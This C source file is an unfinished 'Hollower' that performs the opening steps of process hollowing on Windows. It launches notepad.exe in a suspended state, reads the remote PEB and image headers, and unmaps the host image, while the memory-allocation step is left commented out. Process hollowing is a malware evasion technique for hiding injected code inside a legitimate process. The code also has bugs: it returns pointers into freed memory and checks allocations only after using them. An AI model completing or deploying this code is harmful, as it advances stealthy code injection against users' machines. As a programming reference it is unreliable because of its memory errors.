#include <Windows.h>
#include <stdio.h>

#include "PEB.h"
#include "Ntapi.h"
#include "Hollower.h"

//
// Hollower logic
//
INT main() {
	STARTUPINFOA			startupInfo;
	PROCESS_INFORMATION		processInformation;
	PLOADED_IMAGE			pImage = NULL;
	_PPEB					pPEB = NULL;
	BOOL					bRet;
	INT						iRet = ERROR_SUCCESS;
	NTSTATUS				ntStatus;
	HANDLE					hHostProcess;

	// Function pointers
	NTUNMAPVIEWOFSECTION	pNtUnmapViewOfSection;
	RTLNTSTATUSTODOSERROR	pRtlNtStatusToDosError;

	//
	// Load required functions from ntdll
	//
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	if (hNtdll) {
		pNtUnmapViewOfSection = (NTUNMAPVIEWOFSECTION)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
		pRtlNtStatusToDosError = (RTLNTSTATUSTODOSERROR)GetProcAddress(hNtdll, "RtlNtStatusToDosError");
		FreeLibrary(hNtdll);
	}
	else {
		printf("[-] Unable resolve functions\r\n");
		return ERROR_API_UNAVAILABLE;
	}
	
	//
	// Create host process
	//
	ZeroMemory(&startupInfo, sizeof startupInfo);
	startupInfo.cb = sizeof startupInfo;
	ZeroMemory(&processInformation, sizeof processInformation);

	if ((bRet = CreateProcessA(NULL,
		"\"notepad.exe\"",
		NULL,
		NULL,
		0,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&startupInfo,
		&processInformation)) != TRUE) 
	{
		printf("[-] Unable to create the host process\r\n");
		iRet = ERROR_CREATE_FAILED;
		goto lblCleanup;
	}

	hHostProcess = processInformation.hProcess;
	pPEB = ReadRemotePEB(hHostProcess);
	pImage = ReadRemoteImage(hHostProcess, pPEB->lpImageBaseAddress);

	//
	// Unmap section in host process
	//
	printf("[*] Unmapping section\r\n");
	ntStatus = pNtUnmapViewOfSection(hHostProcess, pPEB->lpImageBaseAddress);
	if (!NT_SUCCESS(ntStatus)) {
		printf("[-] Error unmapping section\r\n");
		iRet = pRtlNtStatusToDosError(ntStatus);
		goto lblCleanup;
	}

	printf("[*] Allocating memory\r\n");
	//PVOID pRemoteImage = VirtualAllocEx(hHostProcess,
	//	pPEB->lpImageBaseAddress,
	//	pSourceHeaders->OptionalHeader.SizeOfImage,
	//	MEM_COMMIT | MEM_RESERVE,
	//	PAGE_EXECUTE_READWRITE);

lblCleanup:
	if (processInformation.hProcess)
		CloseHandle(processInformation.hProcess);

	if (processInformation.hThread)
		CloseHandle(processInformation.hThread);

	if (pPEB)
		free(pPEB);  // todo: replace with virtualfree

	if (pImage)
		free(pImage);   // todo: replace with virtualfree

	return iRet;
}

//
// Helper functions
//
PPROCESS_BASIC_INFORMATION FindRemotePeb(CONST HANDLE hProcess) {																								// NOLINT(misc-misplaced-const)
	PPROCESS_BASIC_INFORMATION pBasicInfo;
	DWORD dwReturnLength = 0;

	NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess;
	
	CONST HMODULE hNtdll = LoadLibraryW(L"ntdll");
	if (hNtdll) {
		pNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, "NtQueryInformationProcess");
		FreeLibrary(hNtdll);
	}
	else {
		return NULL;
	}

	pBasicInfo = malloc(sizeof(PROCESS_BASIC_INFORMATION));  // todo: Replace with virtualalloc
	pNtQueryInformationProcess(hProcess,
		0,
		pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength);
	
	if (pBasicInfo)
		return pBasicInfo;

	free(pBasicInfo);  // todo: replace with virtualfree
	return NULL;
}

_PPEB ReadRemotePEB(HANDLE hProcess) {
	PPROCESS_BASIC_INFORMATION	pBasicInfo = FindRemotePeb(hProcess);
	if (!pBasicInfo)
		return NULL;

	DWORD dwPEBAddress = pBasicInfo->PebBaseAddress;

	_PPEB pPEB = malloc(sizeof(_PEB));  // todo: Replace with virtualalloc
	if (!pPEB)
		return NULL;

	BOOL bSuccess = ReadProcessMemory(hProcess,
		(LPCVOID)dwPEBAddress,
		pPEB,
		sizeof(_PEB),
		0);
	if (!bSuccess) {
		free(pPEB);  // todo: replace with virtualfree
		pPEB = NULL;    
	}

	if (pBasicInfo)
		free(pBasicInfo);  // todo: replace with virtualfree

	return pPEB;
}

PLOADED_IMAGE ReadRemoteImage(HANDLE hProcess, LPCVOID lpImageBaseAddress) {
	PLOADED_IMAGE pImage = NULL;
	
	BYTE* lpBuffer = malloc(BUFFER_SIZE);  // todo: Replace with virtualalloc
	if (!lpBuffer)
		return NULL;

	BOOL bSuccess = ReadProcessMemory(hProcess,
		lpImageBaseAddress,
		lpBuffer,
		BUFFER_SIZE,
		0);
	if (!bSuccess)
		goto lblCleanup;

	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)lpBuffer;
	pImage = malloc(sizeof(LOADED_IMAGE));  // todo: Replace with virtualalloc
	if (!pImage)
		goto lblCleanup;

	pImage->FileHeader = (PIMAGE_NT_HEADERS32)(lpBuffer + pDOSHeader->e_lfanew);
	pImage->NumberOfSections = pImage->FileHeader->FileHeader.NumberOfSections;
	pImage->Sections = (PIMAGE_SECTION_HEADER)(lpBuffer + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

lblCleanup:
	if (lpBuffer)
		free(lpBuffer);  // todo: replace with virtualfree

	return pImage;
}